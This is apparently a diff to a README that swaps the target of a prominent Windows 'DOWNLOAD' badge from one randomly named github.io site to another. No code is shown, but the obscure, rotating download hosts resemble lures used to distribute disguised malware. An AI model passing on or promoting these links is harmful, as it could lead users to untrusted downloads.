@@ -2,7 +2,7 @@
 
 <p align="center">
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://zenboulderagora.github.io/Windw/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://yobowgileysb.github.io/WinDownload/)
 [![VERSION](https://img.shields.io/badge/VERSION-1.3.0-27AE60?style=for-the-badge)]()
 [![PLATFORM](https://img.shields.io/badge/PLATFORM-WINDOWS-0078D4?style=for-the-badge)]()
 
